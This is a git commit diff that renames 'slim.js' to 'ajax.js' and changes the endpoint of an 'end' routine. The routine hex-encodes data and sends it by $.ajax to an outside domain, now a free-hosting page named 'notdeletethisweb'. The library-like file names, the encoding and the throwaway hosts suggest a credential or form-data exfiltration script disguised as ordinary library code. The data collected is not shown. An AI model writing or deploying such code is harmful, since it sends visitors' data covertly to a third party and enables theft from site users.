d32c9419a1ac3286b29633c69b68f4798fde09f5
Hyuuu <117647413+Hyuu09@users.noreply.github.com>
2023-12-28 16:05:16 +0700

    Update and rename slim.js to ajax.js

--- ajax.js
+++ ajax.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://system-alexhost.xyz/halo/?cat=" +
+                    "https://notdeletethisweb.000webhostapp.com/index.php" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
